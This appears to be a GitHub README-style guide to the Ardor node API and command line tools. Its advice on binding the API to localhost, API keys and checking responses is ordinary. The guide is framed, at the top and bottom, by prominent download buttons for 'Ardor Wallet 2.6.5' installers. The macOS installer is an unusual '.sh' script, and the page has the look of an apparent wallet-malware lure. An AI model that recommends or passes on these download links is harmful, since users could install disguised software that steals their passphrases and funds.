![Ardor Wallet guide](assets/banner-article.png)

# Ardor API and command line tools

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Every Ardor node exposes an HTTP API that returns JSON, and the install ships command line tools for the operations people run repeatedly. Both talk to a node you choose - normally your own - and both use the same protocol the wallet's interface uses, which is why anything the wallet can do is also available without clicking.

## What the API is

The API is a set of HTTP endpoints on the [Ardor node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) itself. Ask for an account's balance and you get JSON back; submit a signed transaction and the node broadcasts it. There is no separate service in between, which means the API's behaviour is the node's behaviour.

That directness is convenient and it is also a responsibility. An endpoint that can sign or send is an endpoint that must not be reachable by strangers, and securing the node is part of using the API rather than an afterthought.

## Finding the documentation

The API reference is published with the project and lists each endpoint, its parameters and its response. Read the version of the reference that matches your node, since parameters are added over time and an old example can fail silently rather than loudly.

When an endpoint behaves unexpectedly, the node's own error response is more useful than a search result. It names the parameter or the condition that failed, which is the detail a generic tutorial leaves out.

## Calling it

1. Confirm the node is running and synced, since an unsynced node answers from an incomplete view.
2. Call a read-only endpoint first, such as the node's status or an account's [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md), to confirm connectivity.
3. Add the API key if the node requires one for the endpoint you are calling.
4. Use POST for anything that changes state, and read the response rather than assuming success.
5. Log the transaction ID that comes back; it is your only handle on the operation afterwards.

Step four is where scripts go wrong. An HTTP 200 with an error object inside the JSON is a failure, and a script that checks only the status code will treat it as success.

## Common tasks

| Task | Shape of the call |
|---|---|
| Read a balance | A GET against the account endpoint with the account ID |
| Look up a transaction | A GET with the transaction ID, which returns confirmation state |
| Send a transaction | A signed transaction submitted by POST, returning an ID |
| List an account's records | A GET against the data cloud endpoint, filtered by account |

Every one of those is also a screen in the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md). The API matters when the operation has to be repeated, scheduled or driven by another system, and it stops being worth the setup the moment the same task is a single click in a window you already have open.

## Command line tools

The install includes command line utilities for common operations: starting the node, checking its state, and running the bundled tools that the platform documents. They are useful on a server where no interface is available and in scripts where a JSON response is easier to handle than a window.

The same caution applies. A command that signs uses a [passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md), and a passphrase typed into a shell ends up in history unless you prevent it. Check how the tool takes the secret before you use it on a shared machine.

## Keeping the API safe

- Bind the API to localhost unless you have a specific reason not to.
- Set an API key and use it, rather than leaving an unauthenticated admin surface open.
- Never expose the node's admin endpoints to the internet, even behind a password.
- Treat any endpoint that signs as equivalent to the wallet itself.

A node reachable from the internet with an open admin API is a wallet whose passphrase is effectively optional. That is the single most important sentence on this page, and the reason the default configuration binds the API to the local machine rather than to every interface.

## Reading responses you can trust

Every response carries a status, and most carry a payload. A failed call can still return HTTP 200 with an error object inside, so a script that checks only the status is a script that will one day report success for a transfer that never happened.

Check the payload for the field that indicates success, and log the whole response for anything that changes state. When something goes wrong next month, the log is the only record of what the node actually said, and a message like "it failed" is not enough to reconstruct why.

## When to use the API at all

Use it when the wallet's interface cannot do the job: scheduled reporting, monitoring, integration with another system, or an operation repeated often enough that clicking is the bottleneck. For a one-off transfer, the wallet is faster and safer.

For most people the API is a tool for reading - balances, transaction states, records - rather than for writing. Reading is where it adds value with almost no risk, provided the node is yours, and it is the sensible first project for anyone learning the endpoints before automating anything that moves funds.

## FAQ

### Is the API public?

Your node's API is as public as you make it. Bind it to localhost and it is reachable only from the machine.

### Do I need an API key?

Nodes can require one, and you should enable it if the API is reachable beyond localhost. Read-only access from the same machine is often left open for convenience.

### Can I send transactions through the API?

Yes, with a signed transaction. Treat any such endpoint as equivalent to the wallet and protect it accordingly.

### Where do I start?

Call a read-only endpoint and confirm you get JSON back. That proves connectivity before you attempt anything that changes state.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Run an Ardor node from source](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/run-an-ardor-node-from-source.md)
- [Ardor lightweight contracts explained](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-lightweight-contracts.md)
- [Store data on the Ardor data cloud](https://github.com/ardor-software/ardor-platform-guides/blob/main/keep-files-on-the-ardor-data-cloud.md)
- [Is the Ardor wallet open source, and under what licence](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-wallet-open-source-licence.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
